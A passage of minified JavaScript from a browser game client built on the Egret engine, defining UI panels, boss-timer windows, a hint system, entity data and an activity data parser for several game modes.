e=0;e<this.eList.numElements;e++){var i=this.eList.getElementAt(e);i&&(i.setValueForFightGo(),i.isCanSet||(t=!1))}t?this.goSave():this.goNoSave()},e.prototype.goSave=function(){r.DominateWorldCT.ins().sendDominateTotemSetting(r.DominateWorldCT.ins().setTotemFightGo),this.isSave=!1
},e.prototype.goNoSave=function(){this.isSave=!1},e.prototype.setGuardEvery=function(){var t=o.GlobalConfig.DominationGuardCfg,e=[];for(var i in t)e.push(t[i]);this.kata.replaceAll(e),this.kata.refresh()},__decorate([delayCall(1e3)],e.prototype,"goSave",null),__decorate([delayCall(1e3)],e.prototype,"goNoSave",null),e}(n.BaseView);e.DominateWorldTotemFightPanel=l,window.DominateWorldTotemFightPanel=l,__reflect(l.prototype,"DominateWorldTotemFightPanel",[]),window.DominateWorldTotemFightPanel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DominateWorldTotemFightItem=void 0;var n=i(42),o=i(3),s=i(0),a=i(27),r=i(78),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DominateTotemFightDetailsSkin",e.totemIdx=0,e.guardCount=0,e.totemIdxTrue=0,e.fourIdxArr=[],e.isCanSet=!1,e.dexArr=["",gettext("上"),gettext("中"),gettext("下")],e.totemArr=[],e.mosterArr=[],e}return __extends(e,t),e.prototype.skinComplete=function(){var t=s.GlobalConfig.DominationCfg,e=s.GlobalConfig.MonstersConfig;t&&(this.name0.text=e[t.totem[0].monId].name,this.icon0.source="monhead"+e[t.totem[0].monId].head+"_png",this.desc0.text=t.toteminfo[0]);var i=s.GlobalConfig.DominationCfg.guard;i&&(this.guardCount=i.length);var n=s.GlobalConfig.DominationCfg.totemIndex2Pos[1];if(n){this.totemIdx=0;for(var o in n)this.totemIdx++;this.totemArr=[],this.totemArr.push({name:"-",langValue:"0",value:"0"});for(var a=1;a<=this.totemIdx;a++)this.totemArr.push({name:gettext(""+this.dexArr[a]),langValue:"1",value:""+a});for(var l=1;this["position"+l+"0"];)this.addChangeEvent(this["position"+l+"0"],this.changeClient),l++}if(this.guardCount>0){this.mosterArr=[],this.mosterArr.push({name:"-",langValue:"0",value:"0"});for(var h=1;h<=this.guardCount;h++)this["name"+h].text=e[i[h-1].monId].name,this["icon"+h].source="monhead"+e[i[h-1].monId].head+"_png",this["desc"+h].text=t.toteminfo[h],this.mosterArr.push({name:gettext(h+"号位"),langValue:"2",value:""+h});for(var l=1;this["position"+l+"1"];)this.addChangeEvent(this["position"+l+"1"],this.changeClient),l++}r.DominateWorldCT.ins().setInitInfo(),this.addChangeEvent(this.position0,this.changeClient)},e.prototype.addChangeEvent=function(t,e){var i=this;t&&t instanceof eui.TabBar?this.addEvent(egret.TouchEvent.CHANGE,t,function(){for(var t=[],n=0;n<arguments.length;n++)t[n]=arguments[n];e.call.apply(e,__spreadArrays([i],t))}):this.addEvent(egret.TouchEvent.CHANGE,t,e)},e.prototype.changeClient=function(t){this.totemIdxTrue=+this.position0.selectItem.value,this.fourIdxArr=[];for(var e=!0,i=0;i<this.guardCount;i++){if(0==+this["position"+(i+1)+"0"].selectItem.value||0==+this["position"+(i+1)+"1"].selectItem.value){e=!1;break}this.fourIdxArr[i]=4*(+this["position"+(i+1)+"0"].selectItem.value-1)+ +this["position"+(i+1)+"1"].selectItem.value}e?this.hasDuplicateValues(this.fourIdxArr)||0==this.totemIdxTrue?(this.isCanSet=!1,a.WarnWin.show(gettext("设置地图位置重复，请重新设置准确"),function(){},this)):this.isCanSet=!0:this.isCanSet=!1},e.prototype.hasDuplicateValues=function(t){for(var e=0;e<t.length;e++)for(var i=e+1;i<t.length;i++)if(t[e]===t[i])return!0;return!1},e.prototype.dataChanged=function(){this.setDatas()},e.prototype.setDatas=function(){var t=this.data;if(t)if(this.round.text=gettext("第{0}轮",n.StringUtils.NumberToChinese(this.data.id)),0==r.DominateWorldCT.ins().setTotemFightArr.length){this.position0.bindData(this.totemArr,t.totemDesign[0].index);for(var e=1;e<=this.guardCount;e++){var i=Math.ceil(t.guardDesign[e-1].index/this.guardCount),o=t.guardDesign[e-1].index%this.guardCount==0?0!=t.guardDesign[e-1].index?this.guardCount:0:t.guardDesign[e-1].index%this.guardCount;this["position"+e+"0"].bindData(this.totemArr,i),this["position"+e+"1"].bindData(this.mosterArr,o)}}else{var s=r.DominateWorldCT.ins().setTotemFightArr;for(var e in s)if(+e==this.data.id-1){var a=s[e].dataArr;for(var l in a){var h=a[l].type;if(1==h){var u=a[l].dataArr;for(var p in u)if(1==u[p].type){this.position0.bindData(this.totemArr,u[p].index);break}}else{var u=a[l].dataArr;for(var d in u){var i=Math.ceil(u[d].index/this.guardCount),o=u[d].index%this.guardCount==0?0!=u[d].index?this.guardCount:0:u[d].index%this.guardCount;this["position"+u[d].type+"0"].bindData(this.totemArr,i),this["position"+u[d].type+"1"].bindData(this.mosterArr,o)}}}break}}},e.prototype.setValueForFightGo=function(){var t,e,i,n,o,s;this.totemIdxTrue=+this.position0.selectItem.value,this.fourIdxArr=[];for(var l=!0,h=0;h<this.guardCount;h++){if(0==+(null===(t=this["position"+(h+1)+"0"].selectItem)||void 0===t?void 0:t.value)||!+(null===(e=this["position"+(h+1)+"0"].selectItem)||void 0===e?void 0:e.value)||0==+(null===(i=this["position"+(h+1)+"1"].selectItem)||void 0===i?void 0:i.value)||!+(null===(n=this["position"+(h+1)+"1"].selectItem)||void 0===n?void 0:n.value)){l=!1;break}this.fourIdxArr[h]=4*(+(null===(o=this["position"+(h+1)+"0"].selectItem)||void 0===o?void 0:o.value)-1)+ +(null===(s=this["position"+(h+1)+"1"].selectItem)||void 0===s?void 0:s.value)}l?this.hasDuplicateValues(this.fourIdxArr)||0==this.totemIdxTrue?(this.isCanSet=!1,a.WarnWin.show(gettext("设置地图位置重复，请重新设置准确"),function(){},this)):(this.isCanSet=!0,r.DominateWorldCT.ins().updateTotemArr(this.data.id-1,this.totemIdxTrue,this.fourIdxArr)):this.isCanSet=!1},e.prototype.clearAll=function(){!this.skin},e}(o.BaseItemRender);e.DominateWorldTotemFightItem=l,window.DominateWorldTotemFightItem=l,__reflect(l.prototype,"DominateWorldTotemFightItem",[]),window.DominateWorldTotemFightItem=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.QiyuBossHurtRankItem=void 0;var n=i(3),o=i(35),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(this._info=this.data,this.skin&&this._info){this.txtRank.text=gettext("第{0}名",this._info.rank),this.txtHurt.text=this._info.hurt+"",this.txtName.text=this._info.actorName;var t=o.TaskCT.ins().qiyuBossInfo;this.imgTouchOff.visible=(null===t||void 0===t?void 0:t.touchoffPlayerId)==this._info.actorId}},e}(n.BaseItemRender);e.QiyuBossHurtRankItem=s,window.QiyuBossHurtRankItem=s,__reflect(s.prototype,"QiyuBossHurtRankItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.QiyuBossReachRewardItem=void 0;var n=i(24),o=i(3),s=i(11),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this._rewardArr=new eui.ArrayCollection,this.lstReward.itemRenderer=s.ItemBase,this.lstReward.dataProvider=this._rewardArr,this.lstReward.touchEnabled=!1,this.dataChanged()},e.prototype.dataChanged=function(){this._info=this.data,this.skin&&this._info&&(this.txtRank.visible=!0,this.imgRank.visible=!1,this.txtRank.text=gettext("阶段{0}",this._info.idx),this.dam.text=n.CommonUtils.overLength(this._info.damage),this._rewardArr.source=this._info.rewards,this._rewardArr.refresh())},e}(o.BaseItemRender);e.QiyuBossReachRewardItem=a,window.QiyuBossReachRewardItem=a,__reflect(a.prototype,"QiyuBossReachRewardItem",[]),window.QiyuBossReachRewardItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StardomainBossWin=void 0;var n=i(8),o=i(1),s=i(77),a=i(0),r=i(10),l=i(23),h=i(12),u=i(7),p=i(2),d=i(27),c=i(83),f=i(337),g=i(191),m=function(t){function e(){var e=t.call(this)||this;return e._sn_="StardomainBossWinSkin",e.curType=0,e.monItemArr=[],e.isKfEnough=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=s.ItemBaseNoName,this.eList.dataProvider=this.eArc=new eui.ArrayCollection([]),c.StardomainCT.ins().reqBossInfo()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.curType=t[0],this.initView(),this.addTouchEvent(this,this.onTap),this.observe(c.StardomainCT.ins().buildRoomBack,this.toOpenRoomView),this.observe(c.StardomainCT.ins().bossInfoBack,this.flusBossReliveInfo),this.observe(c.StardomainCT.ins().myInfoBack,this.updateView),this.observe(l.GameLogic.ins().doKfCost,this.updateView),this.eScroller.addEventListener(egret.Event.RESIZE,this.initScroll,this),this.updateView(),this.initScroll()},e.prototype.initScroll=function(){this.eScroller.viewport.scrollH=300;this.eScroller.$children[0].scaleX = 0.52;this.eScroller.$children[0].scaleY = 0.52;},e.prototype.onTap=function(t){var e;switch(t.target){case this.eCloseBtn:win.close(this);break;case this.eBtn:this.isKfEnough?this.openRoom():d.WarnWin.show(gettext("讨伐令不足，击杀后将无法获得奖励。是否进入？"),this.openRoom,this);break;case this.btnHelp:win.open("CommonHelpWin",(null===(e=a.GlobalConfig.HelpInfoConfig[346])||void 0===e?void 0:e.text)||"")}},e.prototype.openRoom=function(){c.StardomainCT.ins().roomId<=0?c.StardomainCT.ins().reqBuildRoom(c.StardomainCT.ins().curSelId):this.toOpenRoomView()},e.prototype.onMonItemTap=function(t){var e=t.currentTarget;e&&(this.curInfo=e.info,c.StardomainCT.ins().curSelId=e.id,this.updateMonSel())},e.prototype.toOpenRoomView=function(){c.StardomainCT.ins().roomId>0&&win.open(g.StardomainRoomView)},e.prototype.flusBossReliveInfo=function(){if(!this.curInfo||!c.StardomainCT.ins().bossInfoDic)return this.reborn.visible=!1,void(this.eBtn.enabled=!0);for(var t=0,e=this.monItemArr;t<e.length;t++){var i=e[t];i.flusTimeFun()}var o=c.StardomainCT.ins().bossInfoDic[this.curInfo.id]?c.StardomainCT.ins().bossInfoDic[this.curInfo.id].time:0;if(0>=o||void 0==o)Timer.stop(this.flusTimeFun,this),this.reborn.visible=!1,this.eBtn.enabled=!0;else{var s=u.GameServerCC.serverTime;o=n.DateUtils.formatMiniDateTime(o),s>=o?(Timer.stop(this.flusTimeFun,this),this.reborn.visible=!1,this.eBtn.enabled=!0):(this.reborn.visible=!0,this.eBtn.enabled=!1,this.reborn.text=gettext("复活中：{0}",n.DateUtils.getFormatBySecond(Math.ceil(.001*(o-s)))),this.flusTimeFun(),Timer.has(this.flusTimeFun,this)||Timer.start(1e3,0,this.flusTimeFun,this))}},e.prototype.flusTimeFun=function(){if(this.curInfo&&c.StardomainCT.ins().bossInfoDic){var t=c.StardomainCT.ins().bossInfoDic[this.curInfo.id]?c.StardomainCT.ins().bossInfoDic[this.curInfo.id].time:0;t=n.DateUtils.formatMiniDateTime(t);var e=t-u.GameServerCC.serverTime;e>0?(this.reborn.visible=!0,this.eBtn.enabled=!1,this.reborn.text=gettext("复活中：{0}",n.DateUtils.getFormatBySecond(Math.ceil(.001*e)))):(this.reborn.visible=!1,this.eBtn.enabled=!0,Timer.stop(this.flusTimeFun,this))}},e.prototype.initView=function(){for(var t=0,e=this.monItemArr;t<e.length;t++){var i=e[t];i.clear()}this.monItemArr=[];for(var n=!1,o=c.StardomainCT.ins().getMonsterInfoList(this.curType),s=0,a=o;s<a.length;s++){var r=a[s],i=new f.StardomainMonItem;i.data=r,this.eMCGroup.addChild(i),i.x=r.x,i.y=r.y,this.addTouchEvent(i,this.onMonItemTap),this.monItemArr.push(i),n||(this.curInfo=r,c.StardomainCT.ins().curSelId=r.id,n=!0)}this.updateMonSel()},e.prototype.updateMonSel=function(){for(var t=0,e=this.monItemArr;t<e.length;t++){var i=e[t];i.updateMonSel()}var n=a.GlobalConfig.StarDomainBossConfig[c.StardomainCT.ins().curSelId];if(n){var o=n.passRewardPre.slice();this.eArc.source=o,this.helpRewardItem.data=n.helpRewardPre?n.helpRewardPre[0]:null,this.updateView()}},e.prototype.updateView=function(){if(this.curInfo){var t=a.GlobalConfig.MonstersConfig[this.curInfo.monsterId];this.boss_name.text=null===t||void 0===t?void 0:t.name,this.eHead.source="img"+(null===t||void 0===t?void 0:t.head)+"_png";var e=(null===t||void 0===t?void 0:t.crusade)||0;this.txtOwn.text=l.GameLogic.ins().kfCost+"",this.txtOwn.textColor=l.GameLogic.ins().kfCost>=e?r.ItemUtil.getQualityColor(1):r.ItemUtil.getQualityColor(5),this.txtCost.text="/"+e;var i=c.StardomainCT.ins().assistCount||0;this.helptimes.text=i+"",this.helptimes.textColor=i>0?r.ItemUtil.getQualityColor(1):r.ItemUtil.getQualityColor(5),this.isKfEnough=l.GameLogic.ins().kfCost>=e,this.flusBossReliveInfo()}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=a.GlobalConfig.StarDomainBaseConfig.openId,n=h.OpenSystem.ins().checkSysOpen(i);return n||p.TipsCT.ins().showTips(h.OpenSystem.ins().getNoOpenTips(i)),n},e.prototype.removeDisplay=function(){this.skin&&this.eScroller.removeEventListener(egret.Event.RESIZE,this.initScroll,this)},e}(o.BaseView);e.StardomainBossWin=m,window.StardomainBossWin=m,__reflect(m.prototype,"StardomainBossWin",[]),window.StardomainBossWin=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StardomainMonItem=void 0;var n=i(8),o=i(16),s=i(3),a=i(22),r=i(0),l=i(7),h=i(83),u=function(t){function e(){var e=t.call(this)||this;return e.id=0,e.isDead=!1,e._sn_="StardomainMonItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){var t;this.info=this.data,this.info&&(this.id=this.info.id,this.currentState="monster"+(null===(t=this.info.cfg)||void 0===t?void 0:t.bossLv),this.updateView())},e.prototype.updateView=function(){var t;if(this.info){var e=r.GlobalConfig.MonstersConfig[this.info.monsterId];e&&(this.des.text=e.name,this.timeGrp.visible=!1,this.monpic.source=(null===(t=this.info.cfg)||void 0===t?void 0:t.showImg)+"_png",this.updateMonSel(),Timer.has(this.flusTimeFun,this)||Timer.start(1e3,0,this.flusTimeFun,this),this.flusTimeFun())}},e.prototype.updateMonSel=function(){this.skin&&(this.imgChoosse.visible=this.id==h.StardomainCT.ins().curSelId)},e.prototype.flusTimeFun=function(){var t;if(this.skin&&this.info&&h.StardomainCT.ins().bossInfoDic){var e=h.StardomainCT.ins().bossInfoDic[this.info.id]?h.StardomainCT.ins().bossInfoDic[this.info.id].time:0;e&&e>0&&(e=n.DateUtils.formatMiniDateTime(e));var i=e-l.GameServerCC.serverTime;if(this.isDead=i>0,this.isDead||Timer.stop(this.flusTimeFun,this),this.isDead)this.timeGrp.visible=!0,this.txtTime.text=gettext("复活中：{0}",n.DateUtils.getFormatBySecond(Math.ceil(.001*i)));else{Timer.stop(this.flusTimeFun,this),this.timeGrp.visible=!1;var o=h.StardomainCT.ins().bossInfoDic[this.info.id]?h.StardomainCT.ins().bossInfoDic[this.info.id].buffId:0,s=r.GlobalConfig.StarDomainBuffConfig[o],u=r.GlobalConfig.EffectsConfig[null===s||void 0===s?void 0:s.buffId];if(s&&u){this.timeGrp.visible=!0;var p=gettext("本轮随机属性：{0}",a.AttributeData.getAttrStrByType(null===(t=u.args)||void 0===t?void 0:t.d));this.txtTime.text=p}}this.dead.visible=this.isDead,this.monpic.visible=!this.isDead}},e.prototype.clear=function(){o.DisplayUtils.removeFromParent(this)},e}(s.BaseItemRender);e.StardomainMonItem=u,window.StardomainMonItem=u,__reflect(u.prototype,"StardomainMonItem",[]),window.StardomainMonItem=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Hint=void 0;var n=i(14),o=i(0),s=i(6),a=i(20),r=i(2),l=function(t){function e(){var e=t.call(this)||this;return e.presceneid=-1,e.prefbId=-1,observe(e,e.seceneIn,Ts.enterScene.enterOK),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.checkHint=function(t,i,n,s){if(!t){switch(i){case e.TARTYPE_WELCOME:return this.showHint(i),!0;case e.TARTYPE_KILL_BOSS:for(var a in o.GlobalConfig.HintConfig){var r=o.GlobalConfig.HintConfig[a];if(r.target[0].guanqiaId==s.gqid)return this.showHint(i,r.image),!0}}return!1}if(t){var l=this.HitConfig(t,i);if(null!=l)return this.showHint(i,l),!0}else for(var a in n){var h=n[a],l=this.HitConfig(h,i);if(null!=l)return this.showHint(i,l),!0}return!1},e.prototype.HitConfig=function(t,i){var n=t;for(var r in o.GlobalConfig.HintConfig){var l=o.GlobalConfig.HintConfig[r];if(l.targetType==i)switch(i){case e.TARTYPE_ACH_BEF:if(n.achievementId==l.target[0].achievementId&&n.taskId==l.target[0].taskId&&l.target[0].isfull&&l.target[0].isfull>0&&s.BagCT.ins().getAllSurplusCount(1))return l.image;break;case e.TARTYPE_ACH_AFT:if(n.achievementId==l.target[0].achievementId&&n.taskId==l.target[0].taskId)return l.image;break;case e.TARTYPE_SCE_IN:if(a.GameMap.mapID==l.target[0].sceneid&&a.GameMap.fubenID==l.target[0].fbId&&this.presceneid==l.target[0].presceneid&&this.prefbId==l.target[0].prefbId)return l.image}}return null},e.prototype.showHint=function(t,i){if(!i&&t==e.TARTYPE_WELCOME){var n=o.GlobalConfig.HintConfig[1];return i=n.image,void r.TipsCT.ins().showHintTips(i)}i&&""!=i&&r.TipsCT.ins().showHintTips(i)},e.prototype.postWelcome=function(){this.checkHint(null,e.TARTYPE_WELCOME)},e.prototype.postAchievementBef=function(t){t&&this.checkHint(t,e.TARTYPE_ACH_BEF)},e.prototype.postAchievementAft=function(t){if(t){var i;for(var n in o.GlobalConfig.AchievementTaskConfig){var s=o.GlobalConfig.AchievementTaskConfig[n];if(s.achievementId==t.achievementId&&s.taskId==t.id){i=s;break}}i&&this.checkHint(i,e.TARTYPE_ACH_AFT)}},e.prototype.seceneIn=function(){-1==this.presceneid&&(this.presceneid=a.GameMap.mapID),-1==this.prefbId&&(this.prefbId=a.GameMap.fubenID);var t=o.GlobalConfig.ScenesConfig[a.GameMap.mapID];t&&(this.checkHint(t,e.TARTYPE_SCE_IN),this.presceneid=a.GameMap.mapID,this.prefbId=a.GameMap.fubenID)},e.prototype.postKillBoss=function(t){this.checkHint(t,e.TARTYPE_KILL_BOSS)},e.prototype.postKillBossEx=function(t){this.checkHint(null,e.TARTYPE_KILL_BOSS,null,{gqid:t})},e.TARTYPE_WELCOME=1,e.TARTYPE_ACH_BEF=2,e.TARTYPE_ACH_AFT=3,e.TARTYPE_SCE_IN=4,e.TARTYPE_KILL_BOSS=5,__decorate([post()],e.prototype,"postWelcome",null),__decorate([post()],e.prototype,"postAchievementBef",null),__decorate([post()],e.prototype,"postAchievementAft",null),__decorate([post()],e.prototype,"postKillBoss",null),__decorate([post()],e.prototype,"postKillBossEx",null),e}(n.BaseSystem);e.Hint=l,window.Hint=l,__reflect(l.prototype,"Hint",[]),Systemap.Hint=function(){return l.ins()},window.Hint=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EntityData=void 0;var n=i(34),o=i(0),s=i(340),a=i(105),r=i(43),l=i(37),h=i(4),u=i(47),p=i(20),d=i(75),c=i(82),f=i(83),g=i(74),m=function(){function t(t){this.isMy=!1,this.showHp=!0,this.isStealth=!1,this.hpHeight=130,this.campModel=a.CampMode.PWACE,this.suitData=[],this.gridX=-1,this.gridY=-1,this.camp=0;var e=t.masterHandle,i=t.sex,n=t.isMy,s=t.name,r=t.x,l=t.y,h=t.configID,u=t.type,p=t.handle,d=t.job,c=t.guildID,f=t.guildName,g=t.bodyID,m=t.weaponID,v=t.wingID,y=t.titleID,C=t.outward,T=t.hpHeight,b=t.belongHandle,w=t.belongName,I=t.lv,_=t.teamId,S=t.campModel,x=t.gridX,D=t.gridY,A=t.suitData,k=t.camp,B=t.demonCirID,P=t.warsoulID,R=t.warsoulLV,E=t.longGasID,G=t.godCrownID;if(this.attr=t.getAttS(),this.handle=p,this.x=r,this.y=l,this._name=s,this.lv=I,this.type=u,this.configID=h,void 0!=n&&(this.isMy=n),this.titleID=y,this.outward=C,this.sex=i,this.job=d,this.masterHandle=e,this.camp=k,this.guildID=c,this.guildName=f,this.hpHeight=T,this.belongName=w,this.belongHandle=b,this.teamId=_,this.demonCirID=B,this.warsoulID=P,this.warsoulLV=R,this.longGasID=E,this.godCrownID=G,this.setCampModel(S),u==EntityType.Role&&(this.bodyID=g,this.wingID=v,this.weaponID=m),u==EntityType.Pet&&(this.bodyID=g),u==EntityType.Monster||u==EntityType.Ring){var M=o.GlobalConfig.MonstersConfig[this.configID],L=M.avatar,F=M.name;this._bodyID=RES_DIR_MONSTER+L,this._name=F}this.gridX=x,this.gridY=D,this.suitData=A}return Object.defineProperty(t.prototype,"wingID",{get:function(){return this._wingID},set:function(t){this._wingID=t},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"weaponID",{get:function(){return this._weaponID},set:function(t){var e=t+(o.GlobalConfig.ClientGlobalConfig.useManRes?"_0":"_"+this.sex);this._weaponID=t?RES_DIR_WEAPON+e:""},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"bodyID",{get:function(){return this._bodyID},set:function(t){if(this.type==EntityType.Pet)return void(this._bodyID=RES_DIR_MONSTER+t);var e=t||"000";e+="_"+this.sex,this._bodyID=RES_DIR_BODY+e},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"hp_max",{get:function(){return this.getAtt(n.AttributeType.atMaxHp)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"hp",{get:function(){return this.getAtt(n.AttributeType.atHp)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"mp",{get:function(){return this.getAtt(n.AttributeType.atMp)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"mp_max",{get:function(){return this.getAtt(n.AttributeType.atMaxMp)||this.getAtt(n.AttributeType.atMp)},enumerable:!1,configurable:!0}),t.prototype.getAtt=function(t){return this.attr[t]||0},t.prototype.setAtt=function(t,e){this.attr[t]=e},Object.defineProperty(t.prototype,"haloID",{get:function(){return""},enumerable:!1,configurable:!0}),t.prototype.publicCD=function(){return 1e6/(this.getAtt(n.AttributeType.atAttackSpeed)*(1+this.getAtt(n.AttributeType.atAttackSpeedPower)/1e4))},Object.defineProperty(t.prototype,"nameColor",{get:function(){var t=this.GetQuality,e=s.ColorConst.EntityColor[t];return e?e:s.ColorConst.EntityColor[0]},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"GetQuality",{get:function(){var t,e=null===(t=o.GlobalConfig.MonstersConfig[this.configID])||void 0===t?void 0:t.quality;return e},enumerable:!1,configurable:!0}),t.prototype.getHpState=function(){var t=this.isMy?"g":"r",e=this.getAtt(n.AttributeType.maxNeiGong);return t+(e>0?2:1)},t.prototype.getNameWithServer2=function(){return this._name},Object.defineProperty(t.prototype,"name",{get:function(){return this._name},enumerable:!1,configurable:!0}),t.prototype.isFriendPet=function(){if(this.type==EntityType.Pet){var t=l.EntityManager.ins().getEntityByHandle(this.masterHandle);if(t)return t.data.isFriend()}return!1},t.prototype.isFriend=function(){if(this.type!=EntityType.Role)return this.type==EntityType.Monster?g.ContestCT.ins().checkIsFriend(this.camp):this.isFriendPet();if(this.isMy)return!0;if(l.EntityManager.ins().checkIsInKillMeList(this.handle))return!1;if(p.GameMap.checkIsInKf3v3())return u.KfArenaSys.ins().checkIsFriend(this.camp);if(p.GameMap.checkIsInShiKongZhiJing())return d.BurningDesertCT.ins().checkIsFriend(this.camp);if(p.GameMap.checkIsInInvade())return c.InvadeCT.ins().checkIsFriend(this.camp);if(p.GameMap.checkIsInStardomain())return f.StardomainCT.ins().checkIsFriend(this.camp);if(p.GameMap.checkIsInShouLei())return g.ContestCT.ins().checkIsFriend(this.camp);if(p.GameMap.checkIsInDominate())return g.ContestCT.ins().checkIsFriend(this.camp);switch(a.CampCC.mode){case a.CampMode.PWACE:return l.EntityManager.ins().checkIsInKillMeList(this.handle)?!1:!0;case a.CampMode.GUILD:return this.guildID>0&&this.guildID==h.ActorCC.guildId;case a.CampMode.ALL:return!1;case a.CampMode.TEAM:return r.CityCC.ins().isMyTeamNumber(this.teamId);default:return!1}},t.prototype.setCampModel=function(t){this.campModel=t},t.prototype.getCampModel=function(){return this.isMy?a.CampCC.mode:this.campModel},t.prototype.isPet=function(){return this.masterHandle&&this.type==EntityType.Pet},t}();e.EntityData=m,window.EntityData=m,__reflect(m.prototype,"EntityData",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ColorConst=void 0;var n=function(){function t(){}return t.EntityColor=[1643537,65388,1816575,16732636,16731648,12651789],t}();e.ColorConst=n,window.ColorConst=n,__reflect(n.prototype,"ColorConst",[]),window.ColorConst=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CastingResultWin=void 0;var n=i(1),o=i(13),s=i(6),a=i(153),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="CastingResultWinSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];this.btnSure.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClickHandler,this);var n,r=e[0];if(r>0)if(this.currentState="success",a.CastingData.ins.isWeared)for(var l=o.SubRoles.ins().getSubRoleByIndex(0),h=l.equipsData,u=0,p=h;u<p.length;u++){var d=p[u];if((null===(t=null===d||void 0===d?void 0:d.item)||void 0===t?void 0:t.handle)==r){n=d.item;break}}else n=s.BagCT.ins().getBagGoodsByHandle(s.BagCT.BAG_TYPE_EQUIP,r);else n=a.CastingData.ins.selCastingEquip,this.currentState="fail";n&&(this.item.data=n)},e.prototype.onClickHandler=function(t){win.close(this)},e}(n.BaseView);e.CastingResultWin=r,window.CastingResultWin=r,__reflect(r.prototype,"CastingResultWin",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.QiyuBossTouchoffWin=void 0;var n=i(1),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="FortuitousBossTouchoffEffSkin",e._canCloseTime=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.img1.scaleX=this.img1.scaleY=0,this._img1X=this.img1.x,this._img1Y=this.img1.y,this._img2X=this.img2.x,this._img2Y=this.img2.y},e.prototype.tweenEnd=function(){var t=this;console.log("tween end"),egret.Tween.get(this.img1).to({alpha:0},600).call(function(){win.close(t)},this),this._flyEndPos&&egret.Tween.get(this.img2).to({x:this._flyEndPos.x,y:this._flyEndPos.y,alpha:0},600)},e.prototype.onClick=function(){egret.getTimer()<this._canCloseTime||win.close(this)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];if(this.skin){this._canCloseTime=egret.getTimer()+4e3,this.img1.x=this._img1X,this.img1.y=this._img1Y,this.img2.x=this._img2X,this.img2.y=this._img2Y,this.img1.alpha=1,this.img2.alpha=1,this.img1.scaleX=this.img1.scaleY=0,this.addTouchEvent(this.rectGrp,this.onClick);var i=egret.getDefinitionByName("MainUI");if(i){var n=win.get(i);if(this._qiyuBossRule=n&&n.getQiyuBossRule(),this._qiyuBossRule){var o=this._qiyuBossRule.localToGlobal(),s=this.img2.parent.globalToLocal(o.x,o.y);this._flyEndPos=new egret.Point(s.x,s.y)}}egret.Tween.get(this.img1).to({scaleX:1.5,scaleY:1.5},600).wait(1e3).call(this.tweenEnd,this)}},e.prototype.removeDisplay=function(){this.skin&&(egret.Tween.removeTweens(this.img1),egret.Tween.removeTweens(this.img2),this.img1.x=this._img1X,this.img1.y=this._img1Y,this.img2.x=this._img2X,this.img2.y=this._img2Y,this.img1.alpha=1,this.img2.alpha=1,this.img1.scaleX=this.img1.scaleY=0)},e}(n.BaseView);e.QiyuBossTouchoffWin=o,window.QiyuBossTouchoffWin=o,__reflect(o.prototype,"QiyuBossTouchoffWin",[]),window.QiyuBossTouchoffWin=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType62Data=void 0;var n=i(0),o=i(238),s=i(344),a=i(33),r=function(t){function e(i,n){var o=t.call(this,i,n)||this;return o.bigRewardState=[],o.boxs=[],o.houses=[],o.openIndexs=[],o._isBigReward=!1,o.changIndex=-1,o.update(i),e.t=o,o}return __extends(e,t),e.prototype.update=function(t){var e=t.readByte();this.boxs=new Array(49),this.rewardType=null,this.openIndexs=[],this.select=null,this.bigRewardId=null,this.bigRewardState=[],this._isBigReward=!1,this.curLayer=e,this.select=t.readInt();for(var i=t.readByte(),o=0;i>o;o++){var s=t.readByte();this.bigRewardState[o]=s}i=t.readByte();for(var o=0;i>o;o++){var a=t.readByte()-1,r=t.readByte(),l=t.readInt(),h=t.readInt(),u=t.readByte();this.boxs[a]={type:r,id:l,count:h,"double":u}}i=t.readByte();for(var o=0;i>o;o++){var r=t.readByte(),l=t.readInt(),h=t.readInt();this.houses.push({type:r,id:l,count:h})}var p=n.GlobalConfig.ActivityType62Config[this.id][this.curLayer];this.select>0&&(this.bigRewardId=p.bigReward[this.select-1].id)},e.prototype.getRewards=function(){return this.houses||[]},e.prototype.parserChange=function(t){this.rewardType=t.readShort();for(var e=t.readBoolean(),i=t.readByte(),n=[],o=[],s=0;i>s;s++){var 